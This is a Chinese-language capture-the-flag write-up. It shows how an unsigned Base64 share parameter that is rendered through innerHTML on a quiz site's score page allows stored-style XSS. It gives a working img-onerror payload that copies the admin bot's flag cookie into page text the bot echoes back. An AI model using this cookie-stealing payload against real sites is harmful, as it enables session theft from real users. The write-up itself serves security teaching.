# 微积分计算小练习

## 题目简述

答题网站会把成绩和用户名编码到分享链接中，管理员机器人访问选手提交的成绩页，并把页面中的问候语和分数打印出来。目标是利用成绩页的前端渲染缺陷，读取机器人浏览器中的 flag Cookie。

## 解题过程

### 追踪分享参数

提交答案后，服务端生成如下内容：

```python
result = base64.b64encode(f"{score}:{name}".encode()).decode()
return redirect(url_for("share", result=result))
```

分享页再在浏览器中解码 `result`，以第一个冒号为界拆出分数和用户名：

```javascript
const result = new URLSearchParams(location.search).get("result");
const decoded = atob(result);
const colon = decoded.indexOf(":");
const score = decoded.substring(0, colon);
const username = decoded.substring(colon + 1);

document.querySelector("#greeting").innerHTML = "您好，" + username + "！";
document.querySelector("#score").innerHTML =
    "您在练习中获得的分数为 <b>" + score + "</b>/100。";
```

`result` 只有 Base64 编码，没有完整性校验，而用户名又进入 `innerHTML`，因此可以控制页面中的 HTML。

### 选择能执行的 XSS 载荷

通过 `innerHTML` 插入的 `<script>` 通常不会执行，所以使用带事件处理器的元素：

```html
<img src=a onerror='document.querySelector("#score").textContent=document.cookie'>
```

不存在的图片会触发 `onerror`。脚本读取 `document.cookie`，再把 Cookie 写进机器人稍后会读取的 `#score` 元素。

构造明文时，冒号前放任意分数字符串，冒号后放载荷，例如：

```text
0:<img src=a onerror='document.querySelector("#score").textContent=document.cookie'>
```

将整串进行 Base64 编码，作为 `/share?result=...` 的参数。也可以在正常答题页面把载荷填入姓名，让站点自动生成链接，减少转义错误。

### 利用机器人的回显

机器人先以秘密参数登录站点，然后执行：

```javascript
document.cookie = "flag=<真实 flag>";
```

接着它访问选手提交的链接，等待页面脚本运行，最后分别读取：

```javascript
document.querySelector("#greeting").textContent
document.querySelector("#score").textContent
```

因此这里不需要把数据发送到外部服务器。载荷把 Cookie 写入 `#score` 后，机器人自己的终端输出就会回显 `flag=...`。

## 方法总结

本题的利用链由三个条件组成：客户端可篡改的 Base64 参数、用户输入进入 `innerHTML`、机器人把页面文本回显给选手。分析 XSS 机器人题时，要同时检查输入落点、脚本执行方式和数据回传渠道。即使机器人无法访问公网，只要它会读取或打印可控 DOM，仍可用页面自身完成数据外带。
